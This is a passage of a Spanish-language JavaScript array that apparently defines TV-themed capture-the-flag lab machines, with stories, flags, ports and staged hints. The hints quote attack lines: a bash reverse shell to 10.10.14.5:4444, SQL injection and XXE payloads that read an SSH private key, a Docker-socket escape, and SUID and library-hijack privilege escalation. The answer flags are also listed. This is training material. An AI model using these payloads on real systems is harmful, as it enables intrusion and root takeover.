      { id: 'cp-2', level: 2, title: 'Objetos Serializados', category: 'foothold', text: 'Identifica la estructura de objetos en base64.' },
      { id: 'cp-3', level: 3, title: 'Exploit con __reduce__', category: 'foothold', text: 'Envía un payload que invoque reverse shell.' },
      { id: 'cp-4', level: 1, title: 'Sudo env_keep', category: 'privesc', text: 'Comprueba sudo -l.' },
      { id: 'cp-5', level: 2, title: 'Inyección de Biblioteca', category: 'privesc', text: 'Usa LD_PRELOAD para interceptar la llamada.' },
      { id: 'cp-6', level: 3, title: 'Compilación de .so', category: 'privesc', text: 'Compila en C con constructor ejecutando /bin/bash.' },
    ],
    openPorts: [
      { port: 22, service: 'SSH', version: 'OpenSSH 9.6', purpose: 'Acceso David' },
      { port: 8080, service: 'HTTP', version: 'Node.js Express', purpose: 'Telemetría Arasaka' },
    ],
    topology: {
      nodes: [
        { id: 'attacker', label: 'Kali Netrunner (10.10.14.5)', type: 'attacker', role: 'Netrunner' },
        { id: 'gateway', label: 'ICE Perimetral Arasaka', type: 'gateway', role: 'Firewall' },
        { id: 'target', label: 'ARASAKA_ICE_BREAK_01', type: 'target', role: 'Servidor Sandevistan' },
        { id: 'internal', label: 'Subred Mikoshi /root', type: 'internal', role: 'Objetivo Root' },
      ],
      links: [
        { from: 'attacker', to: 'gateway', proto: 'Cyberdeck', desc: 'Enlace' },
        { from: 'gateway', to: 'target', proto: 'HTTP: 8080, SSH: 22', desc: 'Puertos' },
        { from: 'target', to: 'internal', proto: 'LD_PRELOAD', desc: 'Escalada' },
      ],
    },
    provisionScript: `#!/usr/bin/env bash\necho "[*] Arasaka ICE Ready"\n`,
    dockerfile: `FROM ubuntu:24.04\nCMD ["/bin/bash"]\n`,
    dockerCompose: `version: '3.8'\nservices:\n  ctf_target:\n    build: .\n`,
    pythonScript: `#!/usr/bin/env python3\nprint("[*] Arasaka Scenario")\n`,
    walkthrough: `# Solución Arasaka\n1. Deserialización.\n2. LD_PRELOAD.`,
  },
  {
    codename: 'LUMON_MDR_TERMINAL_01',
    themeName: 'Severance - Lumon Industries Macrodata Refinement',
    genre: 'tv_series',
    difficulty: 'Medium',
    vector: 'SQL Injection Ciega basada en tiempo en Endpoint de Cuadrícula',
    secondaryVector: 'Sudo NOPASSWD en script de rotación de logs',
    targetOS: 'Ubuntu 24.04 LTS',
    ip: '10.10.110.150',
    story: `En la planta cercenada de Lumon Industries, los empleados categorizan números temibles. Una inyección SQL temporal en la cuadrícula permite inferir el protocolo secreto de contingencia.`,
    userFlag: 'CTF{pr4153_k13r_m4cr0d4t4_r3f1n3m3nt}',
    rootFlag: 'CTF{0v3rt1m3_c0nt1ng3ncy_pr0t0c0l_r00t}',
    userFlagPath: '/home/mark_s/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'sv-1', level: 1, title: 'Retardos de Tiempo', category: 'recon', text: 'Analiza respuestas usando la función pg_sleep o SLEEP.' },
      { id: 'sv-2', level: 2, title: 'Inyección en Cuadrícula', category: 'foothold', text: 'Prueba 1\' OR SLEEP(5)--.' },
      { id: 'sv-3', level: 3, title: 'Extracción de Hash', category: 'foothold', text: 'Usa sqlmap con técnica temporal para extraer la clave de Mark S.' },
      { id: 'sv-4', level: 1, title: 'Permisos Sudo', category: 'privesc', text: 'Ejecuta sudo -l como mark_s.' },
      { id: 'sv-5', level: 2, title: 'Permisos de Escritura', category: 'privesc', text: 'Comprueba los permisos de /opt/lumon/log_rotate.sh.' },
      { id: 'sv-6', level: 3, title: 'Sobreescritura', category: 'privesc', text: 'Inserta una reverse shell en el script y ejecútalo con sudo.' },
    ],
    openPorts: [
      { port: 22, service: 'SSH', version: 'OpenSSH 9.6', purpose: 'Acceso Mark S' },
      { port: 80, service: 'HTTP', version: 'Nginx + Node', purpose: 'Terminal MDR' },
    ],
    topology: {
      nodes: [
        { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Innie Rebelde' },
        { id: 'gateway', label: 'Ascensor Cercenado Lumon', type: 'gateway', role: 'Segmentación' },
        { id: 'target', label: 'LUMON_MDR_TERMINAL_01', type: 'target', role: 'Consola Macrodatos' },
        { id: 'internal', label: 'Bóveda de Kier Eagan', type: 'internal', role: 'Objetivo Root' },
      ],
      links: [
        { from: 'attacker', to: 'gateway', proto: 'VPN', desc: 'Canal' },
        { from: 'gateway', to: 'target', proto: 'HTTP: 80, SSH: 22', desc: 'Red' },
        { from: 'target', to: 'internal', proto: 'Sudo', desc: 'Escalada' },
      ],
    },
    provisionScript: `#!/usr/bin/env bash\necho "[*] Lumon Terminal Ready"\n`,
    dockerfile: `FROM ubuntu:24.04\nCMD ["/bin/bash"]\n`,
    dockerCompose: `version: '3.8'\nservices:\n  ctf_target:\n    build: .\n`,
    pythonScript: `#!/usr/bin/env python3\nprint("[*] Lumon Scenario")\n`,
    walkthrough: `# Solución Severance\n1. Time-based SQLi.\n2. Sudo log_rotate.sh.`,
  },
  {
    codename: 'LOS_POLLOS_HERMANOS_01',
    themeName: 'Breaking Bad - Los Pollos Hermanos Logistics Portal',
    genre: 'tv_series',
    difficulty: 'Medium',
    vector: 'IDOR & Carga Arbitraria de Archivos en Albaranes',
    secondaryVector: 'Cronjob de sincronización ejecutando script con permisos de escritura',
    targetOS: 'Debian 12 Bookworm',
    ip: '10.10.110.160',
    story: `Los Pollos Hermanos opera una plataforma logística de albaranes que camufla envíos confidenciales de metilamina. Una referencia directa a objetos insegura permite interceptar rutas y subir archivos ejecutables.`,
    userFlag: 'CTF{l05_p0ll05_h3rm4n05_1d0r_pwn3d}',
    rootFlag: 'CTF{1_4m_th3_0n3_wh0_kn0ck5_h3153nb3rg}',
    userFlagPath: '/home/jesse/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'bb-1', level: 1, title: 'Parámetros de Factura', category: 'recon', text: 'Modifica el valor de invoice_id en la URL.' },
      { id: 'bb-2', level: 2, title: 'Albarán 42', category: 'foothold', text: 'Accede al formulario de carga administrativa de recibos.' },
      { id: 'bb-3', level: 3, title: 'Subida de Webshell', category: 'foothold', text: 'Sube un archivo .phtml ejecutable.' },
      { id: 'bb-4', level: 1, title: 'Cronjobs', category: 'privesc', text: 'Revisa /etc/cron.d/sync_madrigal.' },
      { id: 'bb-5', level: 2, title: 'Permisos de Script', category: 'privesc', text: 'Verifica permisos de /opt/madrigal/sync_inventory.sh.' },
      { id: 'bb-6', level: 3, title: 'Bit SUID en Bash', category: 'privesc', text: 'Añade chmod u+s /bin/bash en el script y espera la ejecución.' },
    ],
    openPorts: [
      { port: 22, service: 'SSH', version: 'OpenSSH 9.2p1', purpose: 'Acceso Jesse' },
      { port: 80, service: 'HTTP', version: 'Apache 2.4.58 + PHP', purpose: 'Portal logístico' },
    ],
    topology: {
      nodes: [
        { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Auditor DEA / Red' },
        { id: 'gateway', label: 'Red Madrigal Electromotive', type: 'gateway', role: 'Perímetro' },
        { id: 'target', label: 'LOS_POLLOS_HERMANOS_01', type: 'target', role: 'Servidor Logístico' },
        { id: 'internal', label: 'Laboratorio de Lavandería /root', type: 'internal', role: 'Objetivo Root' },
      ],
      links: [
        { from: 'attacker', to: 'gateway', proto: 'VPN', desc: 'Canal' },
        { from: 'gateway', to: 'target', proto: 'HTTP: 80, SSH: 22', desc: 'Puertos' },
        { from: 'target', to: 'internal', proto: 'Cronjob', desc: 'Escalada' },
      ],
    },
    provisionScript: `#!/usr/bin/env bash\necho "[*] Los Pollos Hermanos Ready"\n`,
    dockerfile: `FROM debian:12-slim\nCMD ["/bin/bash"]\n`,
    dockerCompose: `version: '3.8'\nservices:\n  ctf_target:\n    build: .\n`,
    pythonScript: `#!/usr/bin/env python3\nprint("[*] Pollos Scenario")\n`,
    walkthrough: `# Solución Breaking Bad\n1. IDOR + Upload.\n2. Cronjob sync_inventory.sh.`,
  },
  {
    codename: 'CALTECH_SHELDON_CLUSTER_01',
    themeName: 'The Big Bang Theory - Caltech Quantum Theory Cluster',
    genre: 'tv_series',
    difficulty: 'Medium',
    vector: 'Command Injection en Calculadora de Matriz Cuántica',
    secondaryVector: 'Binario SUID de control de nitrógeno líquido con secuestro de librería compartida',
    targetOS: 'Debian 12 Bookworm',
    ip: '10.10.110.170',
    story: `En el Departamento de Física Teórica de Caltech, Sheldon Cooper ha protegido celosamente el servidor de supercomputación donde compila simulaciones de la Teoría de Cuerdas y almacena el borrador de su futuro Premio Nobel. Leonard y Raj descubrieron que la calculadora web de matrices cuánticas no filtra caracteres de shell al evaluar expresiones sympy.`,
    userFlag: 'CTF{b4z1ng4_5h3ld0n_c00p3r_qu4ntum_c0mput3}',
    rootFlag: 'CTF{str1ng_th30ry_n0b3l_pr1z3_5h3ld0n_r00t}',
    userFlagPath: '/home/leonard/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'bbt-1', level: 1, title: 'Análisis de Parámetros Matemáticos', category: 'recon', text: 'Inspecciona la petición POST en /api/quantum-flux. ¿Se sanitizan operadores como punto y coma (;) o tuberías (|)?' },
      { id: 'bbt-2', level: 2, title: 'Inyección de Comandos Bash', category: 'foothold', text: 'Envía "matrix=identity; id" para comprobar la ejecución de comandos bajo la cuenta de servicio leonard.' },
      { id: 'bbt-3', level: 3, title: 'Reverse Shell hacia tu Máquina', category: 'foothold', text: 'Usa "matrix=identity; bash -c \'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\'" para capturar la bandera user.txt.' },
      { id: 'bbt-4', level: 1, title: 'Inspección de Binarios de Laboratorio', category: 'privesc', text: 'Ejecuta "find / -perm -u=s -type f 2>/dev/null". Observa el ejecutable /usr/local/bin/cryo-coolant.' },
      { id: 'bbt-5', level: 2, title: 'Ldd y Dependencias de Librerías', category: 'privesc', text: 'Ejecuta ldd /usr/local/bin/cryo-coolant. Busca librerías en /usr/local/lib con permisos de escritura para el grupo physics.' },
      { id: 'bbt-6', level: 3, title: 'Sobrescritura de libcoolant.so', category: 'privesc', text: 'Compila una librería maliciosa con constructor __attribute__((constructor)) en /usr/local/lib/libcoolant.so para spawnear /bin/bash como root.' },
    ],
    openPorts: [
      { port: 22, service: 'SSH', version: 'OpenSSH 9.2p1', purpose: 'Acceso Leonard/Raj' },
      { port: 80, service: 'HTTP', version: 'Gunicorn/Flask', purpose: 'Calculadora Cuántica Caltech' },
    ],
    topology: {
      nodes: [
        { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Auditor Caltech' },
        { id: 'gateway', label: 'Firewall Campus Caltech', type: 'gateway', role: 'Perímetro' },
        { id: 'target', label: 'CALTECH_SHELDON_CLUSTER_01', type: 'target', role: 'Clúster Cuántico' },
        { id: 'internal', label: 'Bóveda Nobel /root', type: 'internal', role: 'Objetivo Root' },
      ],
      links: [
        { from: 'attacker', to: 'gateway', proto: 'VPN', desc: 'Canal' },
        { from: 'gateway', to: 'target', proto: 'HTTP: 80, SSH: 22', desc: 'Puertos' },
        { from: 'target', to: 'internal', proto: 'SUID Cryo', desc: 'Escalada' },
      ],
    },
    provisionScript: `#!/usr/bin/env bash\necho "[*] Caltech Cluster Initialized. Bazinga!"\n`,
    dockerfile: `FROM debian:12-slim\nRUN apt-get update && apt-get install -y python3\nCMD ["/bin/bash"]\n`,
    dockerCompose: `version: '3.8'\nservices:\n  caltech_target:\n    build: .\n    container_name: caltech_cluster\n`,
    pythonScript: `#!/usr/bin/env python3\n# Exploit Caltech Quantum Flux\nimport requests\nprint("[*] Targeting Caltech cluster...")\n`,
    walkthrough: `# Guía Caltech: Sheldon Cluster\n1. Inyección en /api/quantum-flux.\n2. Secuestro de libcoolant.so en /usr/local/bin/cryo-coolant.`,
  },
  {
    codename: 'DHARMA_SWAN_STATION_108',
    themeName: 'Lost - Dharma Initiative Swan Station Terminal',
    genre: 'tv_series',
    difficulty: 'Hard',
    vector: 'Buffer Overflow en Intérprete de Números 4 8 15 16 23 42 (Puerto 108 TCP)',
    secondaryVector: 'Permiso NOPASSWD en el script failsafe_protocol.sh del campo electromagnético',
    targetOS: 'Ubuntu 24.04 LTS',
    ip: '10.10.110.180',
    story: `En la Isla, oculta tras una escotilla subterránea, opera la Estación 3 (El Cisne) de la Iniciativa Dharma. Cada 108 minutos, una alarma exige introducir la secuencia 4 8 15 16 23 42 en una terminal Apple II conectada a un servidor UNIX para disipar la acumulación electromagnética. Desmond Hume descubrió que el demonio de red del puerto 108 no valida la longitud del búfer de entrada.`,
    userFlag: 'CTF{4_8_15_16_23_42_dh4rm4_15l4nd_pwn3d}',
    rootFlag: 'CTF{5w4n_3l3ctr0m4gn3t1c_f41l54f3_turn_k3y_r00t}',
    userFlagPath: '/home/desmond/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'lost-1', level: 1, title: 'Escaneo de Puertos Extraños', category: 'recon', text: 'Realiza un escaneo completo de puertos TCP. Descubrirás el servicio "dharma-timer" escuchando en el puerto 108.' },
      { id: 'lost-2', level: 2, title: 'Prueba de Desbordamiento de Cadena', category: 'foothold', text: 'Conéctate con nc 10.10.110.180 108 y envía más de 128 caracteres. Observa si el servicio se reinicia o produce un segmentation fault.' },
      { id: 'lost-3', level: 3, title: 'Sobrescritura de EIP/RIP', category: 'foothold', text: 'El binario carece de protección de pila (No-Canary). Sobrescribe la dirección de retorno para saltar a la función secret_island_debug() que ejecuta una shell.' },
      { id: 'lost-4', level: 1, title: 'Auditoría Sudo de Desmond', category: 'privesc', text: 'Ejecuta "sudo -l". Comprueba los comandos que Desmond Hume puede ejecutar como superusuario.' },
      { id: 'lost-5', level: 2, title: 'Inspección de /opt/dharma/failsafe.sh', category: 'privesc', text: 'El script invoca una función externa definida en un archivo de configuración modificable por desmond.' },
      { id: 'lost-6', level: 3, title: 'Inyección en la Configuración de Failsafe', category: 'privesc', text: 'Inserta "FAILSAFE_ACTION=/bin/bash" en /etc/dharma/station.conf y ejecuta sudo /opt/dharma/failsafe.sh para obtener root.' },
    ],
    openPorts: [
      { port: 22, service: 'SSH', version: 'OpenSSH 9.6p1', purpose: 'Acceso Desmond Hume' },
      { port: 108, service: 'TCP', version: 'Dharma Sequence Receiver 1.0', purpose: 'Recepción 4 8 15 16 23 42' },
      { port: 80, service: 'HTTP', version: 'Nginx + Dharma Orientation Video', purpose: 'Vídeo Orientación Dr. Pierre Chang' },
    ],
    topology: {
      nodes: [
        { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Superviviente Vuelo Oceanic 815' },
        { id: 'gateway', label: 'Campo Electromagnético Isla', type: 'gateway', role: 'Perímetro' },
        { id: 'target', label: 'DHARMA_SWAN_STATION_108', type: 'target', role: 'Terminal Estación 3' },
        { id: 'internal', label: 'Cámara Failsafe /root', type: 'internal', role: 'Objetivo Root' },
      ],
      links: [
        { from: 'attacker', to: 'gateway', proto: 'Radio', desc: 'Canal' },
        { from: 'gateway', to: 'target', proto: 'TCP: 108, 80', desc: 'Puertos' },
        { from: 'target', to: 'internal', proto: 'Failsafe Key', desc: 'Escalada' },
      ],
    },
    provisionScript: `#!/usr/bin/env bash\necho "[*] 4 8 15 16 23 42... Dharma Terminal Armed."\n`,
    dockerfile: `FROM ubuntu:24.04\nCMD ["/bin/bash"]\n`,
    dockerCompose: `version: '3.8'\nservices:\n  dharma_target:\n    build: .\n    container_name: dharma_swan\n`,
    pythonScript: `#!/usr/bin/env python3\n# Buffer Overflow Dharma 108\nimport socket\nprint("[*] Connecting to Dharma Swan...")\n`,
    walkthrough: `# Guía Lost: Dharma Swan Station\n1. Buffer Overflow en puerto 108 TCP.\n2. Sudo NOPASSWD en /opt/dharma/failsafe.sh.`,
  },
  {
    codename: 'FBI_XFILES_ARCHIVE_01',
    themeName: 'The X-Files - FBI Classified Vault & Syndicate Secrets',
    genre: 'tv_series',
    difficulty: 'Medium',
    vector: 'SQL Injection en Buscador de Archivos Clasificados Forenses',
    secondaryVector: 'Capacidades de Linux mal configuradas (cap_setuid) en visor de microfichas',
    targetOS: 'Debian 12 Bookworm',
    ip: '10.10.110.190',
    story: `En el sótano sin ventanas de la sede central del FBI en Washington D.C., los agentes especiales Fox Mulder y Dana Scully catalogan avistamientos de OVNIs y casos paranormales no resueltos. El Sindicato gubernamental y El Fumador han bloqueado el acceso a las autopsias biológicas. Una inyección SQL en el buscador de evidencias permite eludir la autenticación.`,
    userFlag: 'CTF{th3_truth_15_0ut_th3r3_mul5cully_pwn3d}',
    rootFlag: 'CTF{c1g4r3tt3_5m0k1ng_m4n_5ynd1c4t3_r00t}',
    userFlagPath: '/home/mulder/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'xf-1', level: 1, title: 'Prueba de Caracteres en el Buscador', category: 'recon', text: 'Introduce una comilla simple (\') en el campo de búsqueda de casos de avistamientos.' },
      { id: 'xf-2', level: 2, title: 'Bypass de Autenticación con UNION SELECT', category: 'foothold', text: 'Usa una inyección basada en UNION para concatenar columnas de la tabla fbi_agents_credentials.' },
      { id: 'xf-3', level: 3, title: 'Extracción de la Clave de Fox Mulder', category: 'foothold', text: 'Extrae el hash de la clave de Mulder, cracked con rockyou.txt (sp00kymuld3r) y accede por SSH.' },
      { id: 'xf-4', level: 1, title: 'Inspección de Linux Capabilities', category: 'privesc', text: 'Ejecuta "getcap -r / 2>/dev/null". Examina el binario /usr/bin/microfiche-viewer.' },
      { id: 'xf-5', level: 2, title: 'Detección de cap_setuid+ep', category: 'privesc', text: 'El visor tiene cap_setuid+ep asignado y admite un flag de depuración (-e) para ejecutar comandos.' },
      { id: 'xf-6', level: 3, title: 'Ejecución con Privilegios Root', category: 'privesc', text: 'Ejecuta "/usr/bin/microfiche-viewer -e /bin/bash" para obtener una shell interactiva de root.' },
    ],
    openPorts: [
      { port: 22, service: 'SSH', version: 'OpenSSH 9.2p1', purpose: 'Acceso Fox Mulder' },
      { port: 80, service: 'HTTP', version: 'Apache 2.4 + PHP FBI Archive', purpose: 'Buscador de Casos OVNI' },
    ],
    topology: {
      nodes: [
        { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Informante Garganta Profunda' },
        { id: 'gateway', label: 'Firewall Sindicato FBI', type: 'gateway', role: 'Perímetro' },
        { id: 'target', label: 'FBI_XFILES_ARCHIVE_01', type: 'target', role: 'Servidor Archivos X' },
        { id: 'internal', label: 'Bóveda Proyecto Genoma Alien /root', type: 'internal', role: 'Objetivo Root' },
      ],
      links: [
        { from: 'attacker', to: 'gateway', proto: 'VPN', desc: 'Canal' },
        { from: 'gateway', to: 'target', proto: 'HTTP: 80, SSH: 22', desc: 'Puertos' },
        { from: 'target', to: 'internal', proto: 'Cap Setuid', desc: 'Escalada' },
      ],
    },
    provisionScript: `#!/usr/bin/env bash\necho "[*] The Truth is Out There. FBI Archives online."\n`,
    dockerfile: `FROM debian:12-slim\nCMD ["/bin/bash"]\n`,
    dockerCompose: `version: '3.8'\nservices:\n  xfiles_target:\n    build: .\n    container_name: fbi_xfiles\n`,
    pythonScript: `#!/usr/bin/env python3\n# SQLi X-Files FBI Vault\nimport requests\nprint("[*] Searching FBI Vault...")\n`,
    walkthrough: `# Guía The X-Files\n1. SQLi en buscador forense.\n2. getcap -r / para explotar cap_setuid en microfiche-viewer.`,
  },
  {
    codename: 'RED_KEEP_LITTLE_BIRDS_01',
    themeName: 'Game of Thrones - Lord Varys Little Birds Network',
    genre: 'tv_series',
    difficulty: 'Medium',
    vector: 'Inyección XXE (XML External Entity) en Receptor de Cuervos Digitales',
    secondaryVector: 'Sudo NOPASSWD en el script de forja de fuego valyrio del piromante',
    targetOS: 'Ubuntu 24.04 LTS',
    ip: '10.10.110.200',
    story: `En la Fortaleza Roja de Desembarco del Rey, Lord Varys "La Araña" gestiona una red de pequeños pajaritos que interceptan los cuervos con mensajes de los Siete Reinos y el Banco de Hierro. Los pergaminos se procesan mediante un endpoint XML que no deshabilita entidades externas (XXE), permitiendo exfiltrar archivos locales del castillo.`,
    userFlag: 'CTF{w1nt3r_15_c0m1ng_h0u53_5t4rk_pwn3d}',
    rootFlag: 'CTF{dr4c4ry5_1r0n_thr0n3_v4lyr14n_f1r3_r00t}',
    userFlagPath: '/home/varys/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'got-1', level: 1, title: 'Inspección de Mensajes de Cuervos', category: 'recon', text: 'El formulario /crows/dispatch.php envía una estructura XML con remitente y mensaje.' },
      { id: 'got-2', level: 2, title: 'Definición de Entidad Externa XML', category: 'foothold', text: 'Declara <!DOCTYPE raven [ <!ENTITY xxe SYSTEM "file:///home/varys/user.txt"> ]> e imprime &xxe;.' },
      { id: 'got-3', level: 3, title: 'Lectura de Clave Privada id_rsa', category: 'foothold', text: 'Usa la entidad para leer "file:///home/varys/.ssh/id_rsa", dale permisos 600 e inicia sesión por SSH.' },
      { id: 'got-4', level: 1, title: 'Comandos Sudo de Varys', category: 'privesc', text: 'Ejecuta "sudo -l". Observa el permiso para ejecutar /opt/guild_alchemists/wildfire_mix.py.' },
      { id: 'got-5', level: 2, title: 'Secuestro de Módulo de Python (Hijacking)', category: 'privesc', text: 'El script importa el módulo "alchemy" sin ruta absoluta. Verifica si tu directorio actual tiene prioridad en PYTHONPATH.' },
      { id: 'got-6', level: 3, title: 'Creación de alchemy.py Malicioso', category: 'privesc', text: 'Crea alchemy.py en tu carpeta actual con import os; os.system("/bin/bash") y ejecuta sudo /opt/guild_alchemists/wildfire_mix.py.' },
    ],
    openPorts: [
      { port: 22, service: 'SSH', version: 'OpenSSH 9.6p1', purpose: 'Acceso Varys' },
      { port: 80, service: 'HTTP', version: 'Apache 2.4 + PHP Cuervos', purpose: 'Receptor de Cuervos' },
    ],
    topology: {
      nodes: [
        { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Espía del Norte' },
        { id: 'gateway', label: 'Muralla de Desembarco del Rey', type: 'gateway', role: 'Perímetro' },
        { id: 'target', label: 'RED_KEEP_LITTLE_BIRDS_01', type: 'target', role: 'Fortaleza Roja' },
        { id: 'internal', label: 'Trono de Hierro /root', type: 'internal', role: 'Objetivo Root' },
      ],
      links: [
        { from: 'attacker', to: 'gateway', proto: 'Cuervo', desc: 'Canal' },
        { from: 'gateway', to: 'target', proto: 'HTTP: 80, SSH: 22', desc: 'Puertos' },
        { from: 'target', to: 'internal', proto: 'Fuego Valyrio', desc: 'Escalada' },
      ],
    },
    provisionScript: `#!/usr/bin/env bash\necho "[*] Varys Little Birds Network Active."\n`,
    dockerfile: `FROM ubuntu:24.04\nCMD ["/bin/bash"]\n`,
    dockerCompose: `version: '3.8'\nservices:\n  got_target:\n    build: .\n    container_name: got_little_birds\n`,
    pythonScript: `#!/usr/bin/env python3\n# XXE Raven Exploit\nimport requests\nprint("[*] Intercepting ravens...")\n`,
    walkthrough: `# Guía Game of Thrones: Little Birds\n1. XXE en /crows/dispatch.php para leer id_rsa.\n2. Secuestro de módulo en wildfire_mix.py con sudo.`,
  },
  {
    codename: 'PIED_PIPER_MIDDLE_OUT_01',
    themeName: 'Silicon Valley - Pied Piper Distributed Cluster',
    genre: 'tv_series',
    difficulty: 'Medium',
    vector: 'Deserialización Insegura de Métricas Weissman en Microservicio Flask',
    secondaryVector: 'Socket de Docker (/var/run/docker.sock) expuesto sin permisos de grupo',
    targetOS: 'Debian 12 Bookworm',
    ip: '10.10.110.210',
    story: `En Silicon Valley, Pied Piper ha desarrollado el revolucionario algoritmo de compresión "Middle-Out" con un Weissman Score imbatible. Bertram Gilfoyle ha levantado un clúster casero de servidores bautizado como "Anton". Gavin Belson y Hooli intentan sabotearlo. Una falla de deserialización con Pickle en el microservicio de telemetría permite tomar control del clúster.`,
    userFlag: 'CTF{m1ddl3_0ut_c0mpr35510n_w3155m4n_5c0r3}',
    rootFlag: 'CTF{4nt0n_53rv3r_g1lf0yl3_d0ck3r_35c4p3_r00t}',
    userFlagPath: '/home/richard/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'sv2-1', level: 1, title: 'Inspección de Cabeceras de Compresión', category: 'recon', text: 'Analiza el endpoint /api/metrics/weissman. Recibe datos binarios comprimidos en Base64.' },
      { id: 'sv2-2', level: 2, title: 'Identificación de Objeto Pickle en Python', category: 'foothold', text: 'Al decodificar la cadena base64 se observa la firma de serialización estándar de Python pickle (\\x80).' },
      { id: 'sv2-3', level: 3, title: 'Payload con __reduce__ para RCE', category: 'foothold', text: 'Genera un payload con una clase que implemente __reduce__ para ejecutar una reverse shell y captura user.txt.' },
      { id: 'sv2-4', level: 1, title: 'Pertenencia a Grupos de Richard', category: 'privesc', text: 'Ejecuta "id". Observa que el usuario richard pertenece al grupo "docker" o tiene acceso directo al socket.' },
      { id: 'sv2-5', level: 2, title: 'Comprobación de /var/run/docker.sock', category: 'privesc', text: 'Verifica los permisos del socket UNIX de Docker. Puedes comunicarte directamente con el daemon de Docker.' },
      { id: 'sv2-6', level: 3, title: 'Escape de Contenedor y Montaje de /', category: 'privesc', text: 'Ejecuta "docker run -v /:/host -it debian chroot /host /bin/bash" para obtener acceso root al sistema anfitrión.' },
    ],
    openPorts: [
      { port: 22, service: 'SSH', version: 'OpenSSH 9.2p1', purpose: 'Acceso Richard Hendricks' },
      { port: 5000, service: 'HTTP', version: 'Gunicorn/Flask Middle-Out API', purpose: 'Microservicio Weissman' },
    ],
    topology: {
      nodes: [
        { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Auditor Hooli' },
        { id: 'gateway', label: 'Router Incubadora Erlich Bachman', type: 'gateway', role: 'Perímetro' },
        { id: 'target', label: 'PIED_PIPER_MIDDLE_OUT_01', type: 'target', role: 'Servidor Anton' },
        { id: 'internal', label: 'Algoritmo Middle-Out /root', type: 'internal', role: 'Objetivo Root' },
      ],
      links: [
        { from: 'attacker', to: 'gateway', proto: 'Wi-Fi', desc: 'Canal' },
        { from: 'gateway', to: 'target', proto: 'HTTP: 5000, SSH: 22', desc: 'Puertos' },
        { from: 'target', to: 'internal', proto: 'Docker Socket Escape', desc: 'Escalada' },
      ],
    },
    provisionScript: `#!/usr/bin/env bash\necho "[*] Pied Piper Middle-Out Online. Anton is watching."\n`,
    dockerfile: `FROM debian:12-slim\nCMD ["/bin/bash"]\n`,
    dockerCompose: `version: '3.8'\nservices:\n  piedpiper_target:\n    build: .\n    container_name: pied_piper_cluster\n`,
    pythonScript: `#!/usr/bin/env python3\n# Pickle Exploit Middle-Out\nimport pickle, os, base64\nprint("[*] Generating Weissman exploit...")\n`,
    walkthrough: `# Guía Silicon Valley: Pied Piper\n1. Pickle Deserialization en /api/metrics/weissman.\n2. Docker socket escape montando la raíz anfitriona (chroot).`,
  },
];
